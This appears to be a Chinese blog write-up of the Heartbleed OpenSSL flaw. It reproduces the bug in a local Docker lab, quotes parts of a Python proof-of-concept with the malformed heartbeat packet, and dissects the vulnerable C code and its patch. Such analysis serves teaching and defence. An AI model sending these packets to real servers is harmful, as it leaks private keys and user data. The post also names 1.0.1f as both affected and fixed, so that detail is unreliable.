---
title: Heartbleed 漏洞分析
tags:
  - Heartbleed
categories: Vulnerability Analysis
keywords:
  - Heartbleed
  - CVE-2014-0160
translate_title: heartbleed-vulnerability-analysis
date: 2018-07-01 12:02:14
---



# 0x01 基础知识

## 1. SSL协议简介
SSL 全称 Secure Sockets Layer（安全套接字层协议），要求建立在可靠的传输层协议（TCP）之上，主要提供机密性、认证性及数据完整性服务。SSL 最初（SSL 1.0、SSL2.0、SSL 3.0 版本）由网景公司设计和维护，从 3.1 版本开始，SSL 协议由因特网工程任务小组（IETF）正式接管，并更名为 TLS（传输层安全协议，Transport Layer Security），发展至今已有 TLS 1.0、TLS1.1、TLS1.2 三个版本。
SSL/TLS 协议能够提供的安全服务主要包括：
- 认证性——使用数字证书认证服务器和客户端身份，防止身份伪造；
- 机密性——使用加密算法防止第三方窃听；
- 完整性——使用消息认证码（MAC）保障数据完整性，防止消息被篡改；
- 重放保护——通过使用隐式序列号防止重放攻击。
SSL/TLS 协议有一个高度模块化的架构，可分为两层：SSL 记录协议为上层协议提供数据封装、压缩、消息认证和完整性保护、加密等安全服务；SSL 上层协议使用 SSL 记录协议提供的服务完成 SSL 通信过程，上层协议包括以下几个子协议：  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/10954248.jpg)  
**SSL 握手协议**：提供建立安全通道的服务，用于协商安全参数和密码套件、服务器身份认证、客户端身份认证（可选）、密钥生成；  
**SSL 修改密文协议**：用于更新当前使用的加密套件。在服务器和客户端间互相通告将启用新的密码规范，使得双方实现同步；  
**SSL 报警协议**：传递握手过程中产生的的错误，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告。

## 2. SSL握手过程
SSL 安全协议中，服务器和客户端间的通信可分为握手阶段和传输阶段。其中，握手阶段需要 2 次握手完成。SSL 的通信过程如下图所示，步骤 1 和步骤 2 完成第一次握手过程，协商通信双方使用的加密方式。同时，客户端获取服务器的数字证书；步骤 3 和步骤 4 完成第二次握手过程，协商后续数据传输所使用的对称加密密钥。至此，SSL 连接建立完成。步骤 5，双方通过 SSL 协议建立的安全通道进行加密传输。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/1996222.jpg)  

## 3. SSL“心跳”机制
SSL 协议完成握手过程后，客户端和服务器间便建立安全可靠的通信。SSL 安全协议工作在传输层的 TCP 协议之上，所以服务器和客户端需要保持持续连接的状态。由于服务器的资源有限，当连接的客户端数量较大时，服务器要维持这些连接将会消耗很多资源，因此需要及时断开完成通信的客户端以减少服务器的负载压力。服务器通过 SSL 的心跳机制可判断客户端是否已完成通信。

RFC6520 文件中规定，SSL 协议中的心跳机制工作于 SSL 记录协议之上，心跳机制中包含两种类型的消息：心跳请求消息（HeartbeatRequest Message）和心跳响应消息（HeartbeatResponse Message），这两种消息具有相同的包结构。当服务器和客户端完成 SSL 协议的握手阶段后，如果客户端一段时间没有与服务器进行数据交互，客户端需要周期性地向服务器发送心跳请求消息。服务器接收到客户端的心跳请求消息，则认为客户端还没有完成通信，继续维持客户端和服务器的连接，并向客户端发送心跳响应消息。

通信双方在建立 SSL 连接时可协商是否支持心跳机制。在 SSL 第一次握手过程中通过 Client Hello 消息和 Server Hello 消息的 Heartbeat Hello 扩展告知对方是否支持心跳机制。Heartbeat Hello 扩展的格式如下。当支持心跳机制时设置 HeartbeatMode 为 peer_allowed_to_send，可接收心跳请求消息并能返回响应包；当不支持心跳机制时设置 HeartbeatMode 为 peer_not_allowed_to_send，若对端发送心跳请求消息，将会丢弃该消息并返回 unexpected_message 警告消息。
```C
enum {
    peer_allowed_to_send(1),
    peer_not_allowed_to_send(2),
} HeartbeatMode;

struct {
    HeartbeatMode mode;
} HeartbeatExtension;
```

心跳包的结构如下图所示，前半部分为 SSL 记录头，Content Type 为消息类型（0x18 表示心跳包消息），TLS Version 为 SSL 版本信息，Record length 为记录长度；后半部分即为心跳消息。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/64534789.jpg)   
其中，SSL 记录长度（Record length）为心跳消息的总长度。
```C
Record length = 1 bytes(Heartbeat Type) + 2 bytes(Payload length) + payload length(Payload) + 16 bytes(Padding)
```
心跳包消息由数据包类型（type）、载荷长度（payload length）、载荷内容（payload）和填充字节（padding）组成。
```C
struct {
      HeartbeatMessageType type;    // 1 bytes，包括request 和 response两种类型
      uint16 payload_length;    // 2 bytes，载荷长度
      opaque payload[HeartbeatMessage.payload_length];    // payload_length bytes，载荷内容
      opaque padding[padding_length];    // 填充字节，至少为16 bytes
} HeartbeatMessage;
```
下图为心跳请求包的数据包实例，其载荷长度为 5 bytes。   
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/91460635.jpg)  

## 4. OpenSSL
OpenSSL 是一个强大的安全套接字层密码开源库，包括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试使用。大多数通过 SSL/TLS 协议加密的网站都使用了 OpenSSL 开源软件包。当 OpenSSL 被爆出安全漏洞时，将会影响所有使用 OpenSSL 开源包的应用。
从结构上看，OpenSSL 分为三层，底层为各种密码算法的实现，中间层是密码算法的抽象接口，顶层是围绕加密算法的 PKCS 的实现，以及 ASN.1 的 DER、BER 编码接口，让这些抽象数据结构最终成为能够在网上传输、在硬盘上存储的数据。

# 0x02 漏洞复现

## 1. 漏洞信息
> 漏洞编号：CVE-2014-0160  
漏洞类型：内存越界访问  
漏洞危害：信息泄露  
影响范围：OpenSSL1.0.1、OpenSSL 1.0.1a~ OpenSSL 1.0.1f、OpenSSL 1.0.2-beta  
漏洞描述：OpenSSL 在实现 TLS（传输层安全协议）和 DTLS（数据报安全传输协议）的心跳包处理逻辑时存在问题。OpenSSL 的 Heartbleed 模块在处理心跳包时没有检查心跳包中的长度字段是否与后续的数据字段一致，攻击者利用该漏洞构造异常数据包，可获取服务器内存中多达 64KB 的数据。这些数据可能会包含证书私钥、用户账号、密码、邮件内容等敏感信息。

## 2. 漏洞复现
### 1）环境
首先需要搭建漏洞测试环境，为节省时间，可以直接使用 Docker Hub 中的测试环境。用以下命令可拉取（pull）已部署漏洞环境的测试镜像。
```bash
docker pull hmlio/vaas-cve-2014-0160
```
该镜像中所部署的服务如下：
```bash
System：Debian GNU/Linux 7 (wheezy)
Http Server：Apache/2.2.22
OpenSSL：openssl-1.0.1e
```
接着运行容器，并使用 -p 参数把容器中 443 端口映射到宿主机的 8443 端口。
```bash
docker run -d -p 8443:443 hmlio/vaas-cve-2014-0160
```
最后在宿主机中用浏览器访问 `https://127.0.0.1:8443`，若服务正常，将返回以下页面。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-6-30/37260673.jpg)  
### 2）测试
从 exploit-db 下载 [POC](https://www.exploit-db.com/exploits/32745/) 对 HTTP 服务器进行测试，并用 tcpdump 捕获攻击过程中通信双方交互的数据。可修改 POC 中畸形心跳请求包的构造方式，原畸形包没有载荷 (payload) 和填充字符 (padding)；修改后的畸形包有完整的包结构。两种构造方式都能成功利用漏洞。
```python
### 构造畸形心跳请求包。
# 原构造方式：
# 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0003:心跳包长度
# 0x01:Heartbleed request类型; 0x4000:payload长度
# hb = h2bin('18 03 02 00 03 01 40 00')

# 修改后的构造方式：
# 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; 
# 0x01:Heartbleed request类型; 0x0155:payload长度; 
# 5*' 41':载荷数据; 16*' 42':填充字节
hb = h2bin('18 03 02'+' 00 08'+' 01'+' 01 55'+5*' 41'+16*' 42')
```
首先使用以下命令运行 tcpdump 监听网络接口，由于 HTTP 服务器部署在 docker 中，需用-i 选项指定网络接口为 docker0，同时用-w 选项把数据包存入 heartbleed.pcap 文件中。
```bash
sudo tcpdump -i docker0 -w heartbleed.pcap
```
接着运行 POC（已做部分修改）发送攻击数据包进行测试。
```bash
python exploit.py -p 8443 127.0.0.1
```
测试结果如下图所示，利用漏洞已成功获取服务器内存中数据，返回的数据中包含了客户端发送的 HTTP 请求头信息。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/55912321.jpg)  
使用 Wireshark 打开数据包文件 heartbleed.pcap，筛选出 SSL 通信数据包有以下 4 个。前 2 个为 SSL 协议握手过程的第一阶段。第 3 个为客户端发送的畸形心跳请求包，该请求包中载荷长度（payload length）为 341 bytes，但是实际载荷内容（payload）的长度为 5 bytes。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/67904758.jpg)  
第 4 个为服务器返回的心跳响应包，由于服务器收到畸形心跳请求包后，在构造心跳响应包时未对载荷长度进行检查，将内存中其它数据与心跳数据（总长度为 341 bytes）一起返回给客户端，导致服务器内存泄露，从下图可看到泄露的服务器内存数据中包含有客户端发送的 HTTP 请求头信息。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/38937640.jpg)  

# 0x03 漏洞原理
Heartleed 漏洞攻击过程如下图所示，客户端向服务器发送心跳载荷长度（payload length）大于实际心跳载荷（payload）长度的心跳请求包，服务器会将内存中的额外数据返回给客户端，可能导致敏感信息泄露。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/16554705.jpg)  
## 1. POC 分析
通过分析 POC 可知， main 函数中首先与服务器建立 socket 连接；接着发送 SSL Client Hello 进行第一次握手，Client Hello 的 Heartbeat Hello 扩展中 Mode 字段为 peer_allowed_to_send 表明客户端支持心跳机制。若服务器返回 Server Hello Done 则表明已完成第一次握手过程；最后发送畸形心跳请求包即可触发漏洞。
```python
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    # 与服务器建立socket连接
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'Connecting...'
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    # 发送 Client Hello 握手包
    print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)
    # 等待服务器返回 Server Hello 握手包
    print 'Waiting for Server Hello...'
    sys.stdout.flush()
    while True:
        typ, ver, pay = recvmsg(s)
        # 服务器未返回 Server Hello 握手包，SSL 第一次握手失败
        if typ == None:
            print 'Server closed connection without sending Server Hello.'
            return
        # 若接收到 Server Hello Done 消息则 break
        # 其中，22表示握手包，0x0E表示握手包类型为 Server Hello Done
        if typ == 22 and ord(pay[0]) == 0x0E:
            break
    # 发送畸形心跳请求包
    print 'Sending heartbeat request...'
    sys.stdout.flush()
    hit_hb(s)
```
POC 中构造的畸形心跳请求包如下图所示，其中载荷长度（0x0155）大于实际载荷数据长度（0x05）。
```python
# 构造心跳请求包。
# 0x18:Heartbleed 消息类型; 0x0302:TLS1.1; 0x0008:心跳包长度; 0x01:Heartbleed request 类型;
# 0x0155:payload 长度; 5*' 41':载荷数据; 16*' 42':填充字节
hb = h2bin('18 03 02'+' 00 08'+' 01'+' 01 55'+5*' 41'+16*' 42')
```
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/95471870.jpg)  
hit_hb() 函数向服务器发送畸形心跳请求包，正常情况下服务器应返回的心跳响应包长度为 24 bytes。
```python
Heartbeat response length = 1 bytes(Heartbeat Type) + 2 bytes(Payload length) + 5 bytes(payload length)
+ 16 bytes(Padding) = 24 bytes
```
若服务器返回长度大于 24 bytes 的心跳响应包，则表明服务器存在该漏洞；若服务器没有返回心跳响应包，而是只返回类型值为 21 的警告包，则表明服务器不存在该漏洞。
```python
def hit_hb(s):
    s.send(hb)    # 发送心跳请求包
    while True:
        typ, ver, pay = recvmsg(s)    # 接收响应包
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False
 
        if typ == 24:    # 若为心跳包，则输出载荷数据
            print 'Received heartbeat response:'
            hexdump(pay)
            if len(pay) > 24:    # 若心跳包总长度大于24，则表明服务器有漏洞
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True
 
        if typ == 21:     # 若为警告包，则表明服务器没有漏洞
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False
```
## 2. 漏洞原理
OpenSSL 是 SSL 协议实现的开源软件包，存在漏洞的两个文件为 ssl/d1_both.c 和 ssl/t1_lib.c，这两个文件中的 dtls1_process_heartbeat() 和 tls1_process_heartbeat() 分别为 DTLS（数据报安全传输协议）和 TLS（传输层安全协议）处理心跳请求包的函数。

### 1）解析心跳请求包
dtls1_process_heartbeat() 函数和 tls1_process_heartbeat() 函数的代码完全相同，下面对 openssl-1.0.1e 源码包中的 dtls1_process_heartbeat() 函数进行分析。dtls1_process_heartbeat() 函数首先解析客户端所发的心跳请求包，代码中将&s->s3->rrec.data[0] 的值赋给指针 p。
```C
// p 指向 SSL3 记录数据，即心跳消息
unsigned char *p = &s->s3->rrec.data[0], *pl;
unsigned short hbtype;
unsigned int payload;
unsigned int padding = 16; /* Use minimum padding */
```
为找到 s->s3->rrec.data[0] 的定义，通过依次寻找 `SSL/ ssl_st/s3/ssl3_state_st/rrec/ SSL3_RECORD` 的顺序，最终找到 SSL 记录结构体 SSL3_RECORD 的定义。
```C
/* crypto/ossl_tpy.h */
typedef struct ssl_st SSL;

/* ssl/ssl.h */
struct ssl_st
{
    ...
	struct ssl2_state_st *s2; /* SSLv2 variables */
	struct ssl3_state_st *s3; /* SSLv3 variables */
	struct dtls1_state_st *d1; /* DTLSv1 variables */
	...
}
/* ssl/ssl3.h */
typedef struct ssl3_state_st
{
	...
	SSL3_RECORD rrec;	/* each decoded record goes in here */
	...
}
/* ssl/ssl3.h */
typedef struct ssl3_record_st
{
/*r */	int type;               /* type of record */
/*rw*/	unsigned int length;      /* How many bytes available */
/*r */	unsigned int off;         /* read/write offset into 'buf' */
/*rw*/	unsigned char *data;      /* pointer to the record data */
/*rw*/	unsigned char *input;     /* where the decode bytes are */
/*r */	unsigned char *comp;     /* only used with decompression - malloc()ed */
/*r */ unsigned long epoch;      /* epoch number, needed by DTLS1 */
/*r */ unsigned char seq_num[8];  /* sequence number, needed by DTLS1 */
} SSL3_RECORD;
```

由 SSL3_RECORD 结构体定义可知，每条 SSL3 记录中都包含类型字段（type）、长度字段（length）和指向记录数据的指针（data），所以 dtls1_process_heartbeat() 函数通过 p = &s->s3->rrec.data[0] 将指针 p 指向心跳消息。接着把心跳类型（0x01）赋给 hbtype；使用 n2s 宏取两个字节的载荷长度（0x0155）赋给变量 payload，并将 p 指针移动 2 个字节，此时指针 p 指向心跳包载荷；最后令 pl 指向心跳包载荷。
```C
hbtype = *p++;  // 心跳包类型
n2s(p, payload);  // 心跳包载荷长度
pl = p;  // pl 指向心跳包载荷
```
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/95471870.jpg)   

### 2）分配内存空间
解析完心跳包后，若心跳包类型为 TLS1_HB_REQUEST，则为后续构造心跳响应包分配长度为 360 bytes 的内存。<font color= red> 这里未对心跳载荷长度字段进行检查就分配内存是漏洞产生的重要原因。</font>
```C
if (hbtype == TLS1_HB_REQUEST)
{
    unsigned char *buffer, *bp;
    int r;
    /* 为心跳响应包分配内存, 大小为 1 byte(Heartbeat Type)+ 2 bytes(Payload length)+
	  * 341 bytes(Payload) + 16 bytes(Padding) = 360 bytes */
    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
    bp = buffer;    // bp指向刚分配的内存
    …
}
```
### 3）构造心跳响应包
分配好内存后构造心跳响应包。首先填充 1 bytes 的心跳包类型为 TLS1_HB_RESPONSE（0x02）；然后填充心跳包载荷长度为 payload（0x0155）；<font color=red>接着填充心跳包的内容（长度为 0x0155 bytes），这一步是漏洞产生的直接原因</font>。这里将指针 pl 所指向内存为起始，长度为 payload 字节的数据作为心跳包内容。由于指针 pl 指向用户提供的心跳请求包载荷，并且心跳包载荷长度（payload）完全由用户控制，当 payload 大于实际心跳请求包载荷的长度时，将导致越界访问内存；最后填充随机字节。
```C
*bp++ = TLS1_HB_RESPONSE;  // 填充 1 byte 的心跳包类型
s2n(payload, bp);  // 填充 2 bytes 的载荷长度
/* 填充心跳响应包载荷（由用户提供），由于心跳包载荷长度（payload）完全由用户
* 控制，当 payload 大于实际心跳包载荷的长度时，将导致越界访问内存。*/
memcpy(bp, pl, payload);
bp += payload;
/* 填充随机字节 */
RAND_pseudo_bytes(bp, padding);
```
由 dtls1_process_heartbeat() 函数构造出的心跳响应包结构如下图所示。  
![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/77216907.jpg)  
### 4）发送心跳响应包
最后通过 dtls1_write_bytes() 函数把构造好的心跳响应包发送给客户端，服务器将会把内存中除客户端发送的心跳包载荷外的其他数据返回给客户端，导致内存泄露。  
```C
/* 将构造好的心跳响应包写入 SSL3_RECORD 中，并返回给客户端 */
r = dtls1_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
```
# 0x04 漏洞修复
openssl-1.0.1f 中该漏洞进行了修复，分析补丁代码可看到 dtls1_process_heartbeat() 函数在解析心跳请求包前添加了对记录长度字段 s->s3->rrec.length 的检查。
- 检查 1：当实际心跳载荷（payload）长度为 0 时，函数返回 0；
- 检查 2：当心跳包载荷长度（payload length）大于实际载荷（payload）的长度时，函数返回 0。 

![](https://hexo-1253637093.cos.ap-guangzhou.myqcloud.com/18-7-1/16326376.jpg)  
添加长度检查后，客户端只有在发送实际心跳载荷（payload）长度大于 0，且心跳包载荷长度 (payload length) 不大于实际心跳包载荷（payload）长度的心跳请求包时，服务器才会返回心跳响应包，因此可成功修补该漏洞。
____
References:   
[1] [Heartbleed docker](https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/)   
[2] [Transport Layer Security (TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension](https://tools.ietf.org/html/rfc6520)  
[3] 强小辉, 陈波, 陈国凯. OpenSSL HeartBleed 漏洞分析及检测技术研究
